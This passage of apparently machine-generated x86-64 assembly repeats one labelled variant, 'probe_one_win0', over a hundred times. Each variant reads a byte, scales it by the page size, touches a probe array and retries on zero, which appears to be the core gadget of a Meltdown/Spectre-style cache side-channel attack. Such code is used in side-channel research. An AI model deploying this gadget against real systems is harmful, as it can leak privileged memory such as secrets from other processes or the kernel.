	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 446
.Lprobe_one_win0_var446:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 447
.Lprobe_one_win0_var447:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 448
.Lprobe_one_win0_var448:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 449
.Lprobe_one_win0_var449:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 450
.Lprobe_one_win0_var450:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 451
.Lprobe_one_win0_var451:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 452
.Lprobe_one_win0_var452:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 453
.Lprobe_one_win0_var453:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 454
.Lprobe_one_win0_var454:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 455
.Lprobe_one_win0_var455:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 456
.Lprobe_one_win0_var456:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 457
.Lprobe_one_win0_var457:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 458
.Lprobe_one_win0_var458:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 459
.Lprobe_one_win0_var459:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 460
.Lprobe_one_win0_var460:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 461
.Lprobe_one_win0_var461:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 462
.Lprobe_one_win0_var462:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 463
.Lprobe_one_win0_var463:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 464
.Lprobe_one_win0_var464:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 465
.Lprobe_one_win0_var465:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 466
.Lprobe_one_win0_var466:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 467
.Lprobe_one_win0_var467:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 468
.Lprobe_one_win0_var468:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 469
.Lprobe_one_win0_var469:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 470
.Lprobe_one_win0_var470:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 471
.Lprobe_one_win0_var471:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 472
.Lprobe_one_win0_var472:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 473
.Lprobe_one_win0_var473:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 474
.Lprobe_one_win0_var474:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 475
.Lprobe_one_win0_var475:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 476
.Lprobe_one_win0_var476:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 477
.Lprobe_one_win0_var477:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 478
.Lprobe_one_win0_var478:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 479
.Lprobe_one_win0_var479:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 480
.Lprobe_one_win0_var480:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 481
.Lprobe_one_win0_var481:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 482
.Lprobe_one_win0_var482:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 483
.Lprobe_one_win0_var483:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 484
.Lprobe_one_win0_var484:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 485
.Lprobe_one_win0_var485:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 486
.Lprobe_one_win0_var486:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 487
.Lprobe_one_win0_var487:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 488
.Lprobe_one_win0_var488:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 489
.Lprobe_one_win0_var489:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 490
.Lprobe_one_win0_var490:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 491
.Lprobe_one_win0_var491:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 492
.Lprobe_one_win0_var492:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 493
.Lprobe_one_win0_var493:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 494
.Lprobe_one_win0_var494:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 495
.Lprobe_one_win0_var495:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 496
.Lprobe_one_win0_var496:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 497
.Lprobe_one_win0_var497:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 498
.Lprobe_one_win0_var498:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 499
.Lprobe_one_win0_var499:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 500
.Lprobe_one_win0_var500:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 501
.Lprobe_one_win0_var501:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 502
.Lprobe_one_win0_var502:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 503
.Lprobe_one_win0_var503:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 504
.Lprobe_one_win0_var504:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 505
.Lprobe_one_win0_var505:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 506
.Lprobe_one_win0_var506:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 507
.Lprobe_one_win0_var507:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 508
.Lprobe_one_win0_var508:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 509
.Lprobe_one_win0_var509:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 510
.Lprobe_one_win0_var510:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 511
.Lprobe_one_win0_var511:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 512
.Lprobe_one_win0_var512:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 513
.Lprobe_one_win0_var513:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 514
.Lprobe_one_win0_var514:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 515
.Lprobe_one_win0_var515:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 516
.Lprobe_one_win0_var516:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 517
.Lprobe_one_win0_var517:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 518
.Lprobe_one_win0_var518:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 519
.Lprobe_one_win0_var519:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 520
.Lprobe_one_win0_var520:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 521
.Lprobe_one_win0_var521:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 522
.Lprobe_one_win0_var522:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 523
.Lprobe_one_win0_var523:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 524
.Lprobe_one_win0_var524:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 525
.Lprobe_one_win0_var525:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 526
.Lprobe_one_win0_var526:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 527
.Lprobe_one_win0_var527:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 528
.Lprobe_one_win0_var528:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 529
.Lprobe_one_win0_var529:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 530
.Lprobe_one_win0_var530:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 531
.Lprobe_one_win0_var531:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 532
.Lprobe_one_win0_var532:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 533
.Lprobe_one_win0_var533:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 534
.Lprobe_one_win0_var534:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 535
.Lprobe_one_win0_var535:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 536
.Lprobe_one_win0_var536:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 537
.Lprobe_one_win0_var537:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 538
.Lprobe_one_win0_var538:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 539
.Lprobe_one_win0_var539:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 540
.Lprobe_one_win0_var540:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 541
.Lprobe_one_win0_var541:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 542
.Lprobe_one_win0_var542:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 543
.Lprobe_one_win0_var543:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 544
.Lprobe_one_win0_var544:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 545
.Lprobe_one_win0_var545:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 546
.Lprobe_one_win0_var546:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 547
.Lprobe_one_win0_var547:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 548
.Lprobe_one_win0_var548:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 549
.Lprobe_one_win0_var549:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 550
.Lprobe_one_win0_var550:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 551
.Lprobe_one_win0_var551:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 552
.Lprobe_one_win0_var552:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 553
.Lprobe_one_win0_var553:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 554
.Lprobe_one_win0_var554:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 555
.Lprobe_one_win0_var555:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 556
.Lprobe_one_win0_var556:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 557
.Lprobe_one_win0_var557:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 558
.Lprobe_one_win0_var558:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 559
.Lprobe_one_win0_var559:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 560
.Lprobe_one_win0_var560:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 561
.Lprobe_one_win0_var561:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 562
.Lprobe_one_win0_var562:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 563
.Lprobe_one_win0_var563:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 564
.Lprobe_one_win0_var564:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 565
.Lprobe_one_win0_var565:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 566
.Lprobe_one_win0_var566:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 567
.Lprobe_one_win0_var567:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 568
.Lprobe_one_win0_var568:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 569
.Lprobe_one_win0_var569:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 570
.Lprobe_one_win0_var570:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 571
.Lprobe_one_win0_var571:
